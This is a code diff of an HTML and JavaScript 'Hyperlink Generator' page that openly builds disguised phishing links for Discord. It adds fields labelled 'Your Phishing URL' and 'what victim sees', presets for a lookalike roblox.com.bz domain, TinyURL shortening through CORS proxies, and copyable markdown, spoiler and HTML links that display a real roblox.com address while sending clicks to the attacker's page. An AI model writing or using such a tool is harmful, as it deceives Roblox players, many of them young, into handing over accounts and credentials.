@@ -11,13 +11,13 @@
     background: #0d1117;
     color: #c9d1d9;
     min-height: 100vh;
+    padding: 20px;
     display: flex;
     justify-content: center;
     align-items: center;
-    padding: 20px;
   }
   .container {
-    max-width: 760px;
+    max-width: 800px;
     width: 100%;
     background: #161b22;
     border: 1px solid #30363d;
@@ -27,7 +27,34 @@
   }
   h1 { font-size: 22px; color: #f0f6fc; margin-bottom: 4px; }
   .sub { color: #8b949e; font-size: 14px; margin-bottom: 24px; padding-bottom: 16px; border-bottom: 1px solid #21262d; }
-  label { display: block; font-size: 13px; font-weight: 600; color: #c9d1d9; margin-bottom: 6px; margin-top: 18px; }
+
+  .link-types {
+    display: flex;
+    gap: 8px;
+    margin-bottom: 18px;
+    flex-wrap: wrap;
+  }
+  .link-types button {
+    padding: 10px 20px;
+    border-radius: 8px;
+    border: 1px solid #30363d;
+    background: #0d1117;
+    color: #c9d1d9;
+    cursor: pointer;
+    font-size: 13px;
+    font-weight: 500;
+    transition: all 0.2s;
+    flex: 1;
+    min-width: 100px;
+  }
+  .link-types button.active {
+    background: #1f6feb;
+    border-color: #1f6feb;
+    color: #fff;
+  }
+  .link-types button:hover:not(.active) { border-color: #58a6ff; }
+
+  label { display: block; font-size: 13px; font-weight: 600; color: #c9d1d9; margin-bottom: 6px; margin-top: 14px; }
   input, textarea {
     width: 100%;
     padding: 10px 14px;
@@ -40,7 +67,12 @@
     transition: border 0.2s;
   }
   input:focus, textarea:focus { outline: none; border-color: #58a6ff; box-shadow: 0 0 0 2px rgba(88,166,255,0.15); }
-  textarea { resize: vertical; min-height: 50px; font-size: 13px; }
+  textarea { resize: vertical; min-height: 44px; font-size: 13px; }
+
+  .form-row { display: flex; gap: 10px; align-items: center; }
+  .form-row input { flex: 1; }
+  .form-row span { color: #8b949e; font-size: 14px; }
+
   .btn-gen {
     width: 100%;
     padding: 12px;
@@ -56,9 +88,10 @@
   }
   .btn-gen:hover { background: #2ea043; }
   .btn-gen:disabled { background: #21262d; color: #484f58; cursor: not-allowed; }
-  
+
   .output-section { display: none; margin-top: 20px; }
   .output-section.show { display: block; }
+
   .output-card {
     background: #0d1117;
     border: 1px solid #30363d;
@@ -66,18 +99,25 @@
     padding: 16px;
   }
   .output-label { font-size: 11px; color: #8b949e; text-transform: uppercase; letter-spacing: 0.8px; margin-bottom: 8px; }
-  .output-display {
+
+  .result-box {
+    background: #0d1117;
+    border: 1px solid #21262d;
+    border-radius: 6px;
+    padding: 14px;
+    margin: 8px 0;
+    font-family: 'SF Mono', monospace;
     word-break: break-all;
-    font-size: 15px;
-    color: #f0f6fc;
-    line-height: 1.5;
-    padding: 8px 0;
+    line-height: 1.6;
+    user-select: all;
+    font-size: 13px;
+    color: #7ee787;
   }
-  .output-display .fake-url { color: #7ee787; }
-  .output-display .arrow { color: #8b949e; margin: 0 8px; }
-  .output-display .real-url { color: #f85149; font-size: 12px; opacity: 0.8; }
-  
-  .btn-row { display: flex; gap: 8px; margin-top: 12px; flex-wrap: wrap; }
+  .result-box .display { color: #f0f6fc; }
+  .result-box .arrow { color: #8b949e; margin: 0 6px; }
+  .result-box .real { color: #f85149; font-size: 12px; }
+
+  .btn-row { display: flex; gap: 8px; margin-top: 10px; flex-wrap: wrap; }
   .btn-copy {
     padding: 7px 16px;
     background: #21262d;
@@ -91,44 +131,32 @@
   }
   .btn-copy:hover { background: #30363d; }
   .btn-copy.copied { background: #238636; border-color: #238636; }
-  
+
   .preview-box {
     margin-top: 12px;
     padding: 12px 14px;
     background: #0d1117;
     border: 1px dashed #30363d;
     border-radius: 6px;
-    font-size: 13px;
     text-align: center;
   }
-  .preview-box .display-text {
+  .preview-box a {
     color: #58a6ff;
     text-decoration: underline;
-    cursor: pointer;
     font-size: 14px;
     word-break: break-all;
   }
-  .preview-box .display-text:hover { color: #79c0ff; }
-  .preview-box .preview-note { font-size: 11px; color: #8b949e; margin-top: 4px; }
-  
-  .methods { display: flex; gap: 8px; margin: 12px 0; flex-wrap: wrap; }
-  .methods button {
-    padding: 8px 16px;
-    border-radius: 20px;
-    border: 1px solid #30363d;
-    background: #0d1117;
-    color: #c9d1d9;
-    cursor: pointer;
-    font-size: 12px;
-    font-weight: 500;
-    transition: all 0.2s;
-    flex: 1;
-    min-width: 90px;
+  .preview-box .note {
+    font-size: 11px;
+    color: #8b949e;
+    margin-top: 4px;
   }
-  .methods button.active { background: #1f6feb; border-color: #1f6feb; color: #fff; }
-  .methods button:hover:not(.active) { border-color: #58a6ff; }
-  
-  .note {
+
+  .status { font-size: 12px; color: #8b949e; margin-top: 8px; text-align: center; min-height: 18px; }
+  .status.error { color: #f85149; }
+  .status.success { color: #7ee787; }
+
+  .info-box {
     font-size: 12px;
     color: #8b949e;
     margin-top: 16px;
@@ -138,113 +166,151 @@
     border-left: 3px solid #d29922;
     line-height: 1.6;
   }
-  .note code { background: #1f6feb22; padding: 1px 5px; border-radius: 3px; color: #58a6ff; }
-  .status { font-size: 12px; color: #8b949e; margin-top: 8px; text-align: center; min-height: 18px; }
-  .status.error { color: #f85149; }
-  .status.success { color: #7ee787; }
+  .info-box code { background: #1f6feb22; padding: 1px 5px; border-radius: 3px; color: #58a6ff; }
 </style>
 </head>
 <body>
 
 <div class="container">
   <h1>&#128279; Hyperlink Generator</h1>
-  <div class="sub">Paste your link &rarr; get a shortened masked hyperlink for Discord</div>
+  <div class="sub">Shorten &amp; mask your links with a real redirect layer</div>
 
-  <label>&#127919; Your Target URL</label>
-  <textarea id="inputUrl" rows="2" placeholder="https://roblox.com.bz/games/920587237/Adopt-Me?privateServerLinkCode=18985109104436914924826938951778"></textarea>
-
-  <label>&#127917; Display Text (what the victim sees)</label>
-  <input type="text" id="displayText" value="https://www.roblox.com/games/920587237/Adopt-Me?privateServerLinkCode=18985109104436914924826938951778">
-
-  <label>&#128279; Mask Method</label>
-  <div class="methods" id="methodContainer">
-    <button data-method="discord" class="active">Discord Markdown</button>
-    <button data-method="spoiler">Spoiler Mask</button>
-    <button data-method="html">HTML Link</button>
+  <label>&#128161; Link Type</label>
+  <div class="link-types" id="linkTypes">
+    <button data-type="games" class="active">&#127918; Game / VIP</button>
+    <button data-type="profile">&#128100; Profile</button>
+    <button data-type="group">&#128101; Group</button>
   </div>
 
-  <button class="btn-gen" id="generateBtn">&#9889; Generate Hyperlink</button>
+  <label>&#127919; Your Phishing URL</label>
+  <input type="url" id="phishUrl" placeholder="https://roblox.com.bz/games/920587237/Adopt-Me?privateServerLinkCode=...">
+
+  <label>&#127917; Display As (what victim sees)</label>
+  <div class="form-row">
+    <span>https://www.roblox.com/</span>
+    <input type="text" id="displayPath" value="games/920587237/Adopt-Me?privateServerLinkCode=18985109104436914924826938951778">
+  </div>
+
+  <label>&#128279; Mask Method</label>
+  <div class="link-types" id="methodTypes" style="margin-bottom:0;">
+    <button data-method="discord" class="active">Discord Markdown</button>
+    <button data-method="spoiler">Spoiler</button>
+    <button data-method="html">HTML Tag</button>
+  </div>
+
+  <button class="btn-gen" id="generateBtn">&#9889; Generate</button>
   <div class="status" id="status"></div>
 
   <div class="output-section" id="outputSection">
     <div class="output-card">
-      <div class="output-label">&#128203; Generated Hyperlink</div>
-      <div class="output-display" id="outputDisplay"></div>
+      <div class="output-label">&#128203; Result</div>
+      <div class="result-box" id="resultBox"></div>
 
       <div class="btn-row">
-        <button class="btn-copy" id="copyBtn">&#128203; Copy Link</button>
-        <button class="btn-copy" id="copyMdBtn">&#127760; Copy Discord MD</button>
-        <button class="btn-copy" id="copyHtmlBtn">&#128196; Copy HTML</button>
+        <button class="btn-copy" id="copyResult">&#128203; Copy</button>
+        <button class="btn-copy" id="copyMd">&#127760; Discord MD</button>
+        <button class="btn-copy" id="copyRaw">&#128279; Raw Short URL</button>
       </div>
 
       <div class="preview-box">
         <div style="font-size:11px;color:#8b949e;margin-bottom:6px;">&#128270; Preview</div>
-        <div class="display-text" id="previewDisplay"></div>
-        <div class="preview-note">Shows Roblox URL &mdash; clicks go to your link via shortener</div>
+        <a id="previewLink" target="_blank">Loading...</a>
+        <div class="note">Text shows real Roblox URL &rarr; click goes to your link via TinyURL</div>
       </div>
     </div>
 
-    <div class="note">
-      <strong>&#9432; How it works:</strong><br>
-      1. Your URL is shortened via TinyURL (through a CORS proxy)<br>
-      2. The short link is wrapped in Discord markdown: <code>[www.roblox.com/...](https://tinyurl.com/abc)</code><br>
-      3. Discord shows the Roblox URL as blue text &mdash; clicks redirect to your link
+    <div class="info-box">
+      <strong>How it works:</strong> Your URL is shortened through TinyURL (via CORS proxy). The result is a fake Roblox link that displays as normal but redirects through the shortener to your actual page. Copy the Discord markdown and paste directly into Discord.
     </div>
   </div>
 </div>
 
 <script>
-const inputUrl = document.getElementById('inputUrl');
-const displayTextInput = document.getElementById('displayText');
-const outputSection = document.getElementById('outputSection');
-const outputDisplay = document.getElementById('outputDisplay');
-const previewDisplay = document.getElementById('previewDisplay');
-const statusEl = document.getElementById('status');
-const generateBtn = document.getElementById('generateBtn');
-const copyBtn = document.getElementById('copyBtn');
-const copyMdBtn = document.getElementById('copyMdBtn');
-const copyHtmlBtn = document.getElementById('copyHtmlBtn');
-const methodBtns = document.querySelectorAll('#methodContainer button');
-
+// ===== STATE =====
 let shortUrl = '';
 let originalUrl = '';
-let displayText = '';
-let selectedMethod = 'discord';
+let displayFull = '';
+let linkType = 'games';
+let method = 'discord';
 
-methodBtns.forEach(btn => {
+// ===== DOM =====
+const phishUrl = document.getElementById('phishUrl');
+const displayPath = document.getElementById('displayPath');
+const resultBox = document.getElementById('resultBox');
+const outputSection = document.getElementById('outputSection');
+const previewLink = document.getElementById('previewLink');
+const statusEl = document.getElementById('status');
+const generateBtn = document.getElementById('generateBtn');
+const copyResult = document.getElementById('copyResult');
+const copyMd = document.getElementById('copyMd');
+const copyRaw = document.getElementById('copyRaw');
+
+// ===== LINK TYPE PRESETS =====
+const presets = {
+  games: {
+    phish: 'https://roblox.com.bz/games/920587237/Adopt-Me?privateServerLinkCode=18985109104436914924826938951778',
+    display: 'games/920587237/Adopt-Me?privateServerLinkCode=18985109104436914924826938951778'
+  },
+  profile: {
+    phish: 'https://roblox.com.bz/users/5736099/profile',
+    display: 'users/5736099/profile'
+  },
+  group: {
+    phish: 'https://roblox.com.bz/groups/1234567/My-Group',
+    display: 'groups/1234567/My-Group'
+  }
+};
+
+document.querySelectorAll('#linkTypes button').forEach(btn => {
   btn.addEventListener('click', () => {
-    methodBtns.forEach(b => b.classList.remove('active'));
+    document.querySelectorAll('#linkTypes button').forEach(b => b.classList.remove('active'));
     btn.classList.add('active');
-    selectedMethod = btn.dataset.method;
+    linkType = btn.dataset.type;
+    const p = presets[linkType];
+    phishUrl.placeholder = p.phish;
+    displayPath.placeholder = p.display;
+    outputSection.classList.remove('show');
+    statusEl.textContent = '';
   });
 });
 
+document.querySelectorAll('#methodTypes button').forEach(btn => {
+  btn.addEventListener('click', () => {
+    document.querySelectorAll('#methodTypes button').forEach(b => b.classList.remove('active'));
+    btn.classList.add('active');
+    method = btn.dataset.method;
+  });
+});
+
+// ===== SHORTEN =====
 async function shorten(url) {
-  // Uses corsproxy.io as a CORS wrapper around TinyURL's API
-  const tinyUrl = `https://tinyurl.com/api-create.php?url=${encodeURIComponent(url)}`;
-  const proxyUrl = `https://corsproxy.io/?url=${encodeURIComponent(tinyUrl)}`;
-  
+  const apiUrl = `https://tinyurl.com/api-create.php?url=${encodeURIComponent(url)}`;
+  const proxyUrl = `https://api.allorigins.win/raw?url=${encodeURIComponent(apiUrl)}`;
+
   const response = await fetch(proxyUrl);
   if (!response.ok) throw new Error(`HTTP ${response.status}`);
   const text = await response.text();
   const trimmed = text.trim();
-  if (!trimmed || trimmed.includes('Error')) throw new Error('TinyURL error');
+  if (!trimmed || trimmed.includes('Error')) throw new Error('Shortener error');
   return trimmed;
 }
 
+// ===== GENERATE =====
 generateBtn.addEventListener('click', async () => {
-  originalUrl = inputUrl.value.trim();
-  displayText = displayTextInput.value.trim();
+  const rawInput = phishUrl.value.trim();
+  const display = displayPath.value.trim();
 
-  if (!originalUrl) {
-    statusEl.textContent = 'Paste your URL first.';
-    statusEl.className = 'status error';
+  if (!rawInput) {
+    const p = presets[linkType];
+    phishUrl.value = p.phish;
+    displayPath.value = p.display;
+    statusEl.textContent = 'Fill in the URL or leave blank to use preset';
+    statusEl.className = 'status';
     return;
   }
-  if (!displayText) {
-    displayText = 'https://www.roblox.com';
-    displayTextInput.value = displayText;
-  }
+
+  originalUrl = rawInput;
+  displayFull = 'https://www.roblox.com/' + (display || presets[linkType].display);
 
   statusEl.textContent = 'Shortening...';
   statusEl.className = 'status';
@@ -253,12 +319,25 @@ generateBtn.addEventListener('click', async () => {
 
   try {
     shortUrl = await shorten(originalUrl);
-    statusEl.textContent = 'Done!';
+    statusEl.textContent = 'Done';
     statusEl.className = 'status success';
     renderOutput();
-    outputSection.classList.add('show');
   } catch (err) {
-    statusEl.textContent = 'Error: ' + err.message + ' — try again';
+    // fallback: try without proxy
+    try {
+      const resp = await fetch(`https://tinyurl.com/api-create.php?url=${encodeURIComponent(originalUrl)}`);
+      const text = await resp.text();
+      const trimmed = text.trim();
+      if (trimmed && !trimmed.includes('Error')) {
+        shortUrl = trimmed;
+        statusEl.textContent = 'Done (direct)';
+        statusEl.className = 'status success';
+        renderOutput();
+        return;
+      }
+    } catch (_) {}
+
+    statusEl.textContent = 'Failed: ' + err.message + ' — check URL and try again';
     statusEl.className = 'status error';
   } finally {
     generateBtn.disabled = false;
@@ -266,85 +345,66 @@ generateBtn.addEventListener('click', async () => {
 });
 
 function renderOutput() {
+  let outputText = '';
   let copyText = '';
-  
-  switch (selectedMethod) {
+
+  switch (method) {
     case 'discord':
-      copyText = `[${displayText}](${shortUrl})`;
-      outputDisplay.innerHTML = `
-        <span class="fake-url">${escHtml(displayText)}</span>
-        <span class="arrow">&rarr;</span>
-        <span class="real-url">${escHtml(shortUrl)}</span>
-      `;
-      previewDisplay.textContent = displayText;
-      previewDisplay.href = shortUrl;
+      copyText = `[${displayFull}](${shortUrl})`;
+      outputText = `<span class="display">${escHtml(displayFull)}</span><span class="arrow">&rarr;</span><span class="real">${escHtml(shortUrl)}</span>`;
       break;
     case 'spoiler':
-      copyText = `||[${displayText}](${shortUrl})||`;
-      outputDisplay.innerHTML = `
-        <span style="background:#21262d;padding:0 4px;border-radius:3px;">||</span>
-        <span class="fake-url">${escHtml(displayText)}</span>
-        <span class="arrow">&rarr;</span>
-        <span class="real-url">${escHtml(shortUrl)}</span>
-        <span style="background:#21262d;padding:0 4px;border-radius:3px;">||</span>
-      `;
-      previewDisplay.textContent = '||' + displayText + '||';
-      previewDisplay.href = shortUrl;
+      copyText = `||[${displayFull}](${shortUrl})||`;
+      outputText = `<span style="background:#21262d;padding:0 4px;border-radius:3px;">||</span> <span class="display">${escHtml(displayFull)}</span><span class="arrow">&rarr;</span><span class="real">${escHtml(shortUrl)}</span> <span style="background:#21262d;padding:0 4px;border-radius:3px;">||</span>`;
       break;
     case 'html':
-      copyText = `<a href="${escHtml(shortUrl)}" target="_blank" rel="noopener noreferrer">${escHtml(displayText)}</a>`;
-      outputDisplay.innerHTML = copyText;
-      previewDisplay.innerHTML = copyText;
-      previewDisplay.href = shortUrl;
+      copyText = `<a href="${escHtml(shortUrl)}" target="_blank" rel="noopener noreferrer">${escHtml(displayFull)}</a>`;
+      outputText = copyText;
       break;
   }
 
-  outputSection.dataset.copyText = copyText;
-  outputSection.dataset.shortUrl = shortUrl;
-  outputSection.dataset.displayText = displayText;
-  outputSection.dataset.method = selectedMethod;
+  resultBox.innerHTML = outputText;
+  resultBox.dataset.copyText = copyText;
+  previewLink.href = shortUrl;
+  previewLink.textContent = displayFull;
+  outputSection.classList.add('show');
 }
 
-function escHtml(str) {
+function escHtml(s) {
   const d = document.createElement('div');
-  d.textContent = str;
+  d.textContent = s;
   return d.innerHTML;
 }
 
-copyBtn.addEventListener('click', () => {
-  const text = outputSection.dataset.copyText;
+// ===== COPY =====
+function doCopy(btn, text) {
   navigator.clipboard.writeText(text).then(() => {
-    copyBtn.textContent = 'Copied!';
-    copyBtn.classList.add('copied');
-    setTimeout(() => { copyBtn.textContent = 'Copy Link'; copyBtn.classList.remove('copied'); }, 2000);
+    btn.textContent = 'Copied';
+    btn.classList.add('copied');
+    setTimeout(() => { btn.textContent = btn.dataset.origText; btn.classList.remove('copied'); }, 2000);
   });
-});
+}
 
-copyMdBtn.addEventListener('click', () => {
-  let md = `[${displayText}](${shortUrl})`;
-  if (selectedMethod === 'spoiler') md = `||${md}||`;
-  navigator.clipboard.writeText(md).then(() => {
-    copyMdBtn.textContent = 'Copied!';
-    copyMdBtn.classList.add('copied');
-    setTimeout(() => { copyMdBtn.textContent = 'Copy Discord MD'; copyMdBtn.classList.remove('copied'); }, 2000);
-  });
+copyResult.addEventListener('click', () => {
+  doCopy(copyResult, resultBox.dataset.copyText || resultBox.textContent);
 });
+copyResult.dataset.origText = 'Copy';
 
-copyHtmlBtn.addEventListener('click', () => {
-  const html = `<a href="${shortUrl}" target="_blank" rel="noopener noreferrer">${displayText}</a>`;
-  navigator.clipboard.writeText(html).then(() => {
-    copyHtmlBtn.textContent = 'Copied!';
-    copyHtmlBtn.classList.add('copied');
-    setTimeout(() => { copyHtmlBtn.textContent = 'Copy HTML'; copyHtmlBtn.classList.remove('copied'); }, 2000);
-  });
+copyMd.addEventListener('click', () => {
+  let md = `[${displayFull}](${shortUrl})`;
+  if (method === 'spoiler') md = `||${md}||`;
+  doCopy(copyMd, md);
 });
+copyMd.dataset.origText = 'Discord MD';
 
-inputUrl.addEventListener('keydown', e => {
-  if (e.key === 'Enter' && !e.shiftKey) { e.preventDefault(); generateBtn.click(); }
+copyRaw.addEventListener('click', () => {
+  doCopy(copyRaw, shortUrl);
 });
-displayTextInput.addEventListener('keydown', e => {
-  if (e.key === 'Enter') { e.preventDefault(); generateBtn.click(); }
-});
+copyRaw.dataset.origText = 'Raw Short URL';
+
+// ===== ENTER =====
+phishUrl.addEventListener('keydown', e => { if (e.key === 'Enter') { e.preventDefault(); generateBtn.click(); } });
+displayPath.addEventListener('keydown', e => { if (e.key === 'Enter') { e.preventDefault(); generateBtn.click(); } });
 </script>
 
 </body>
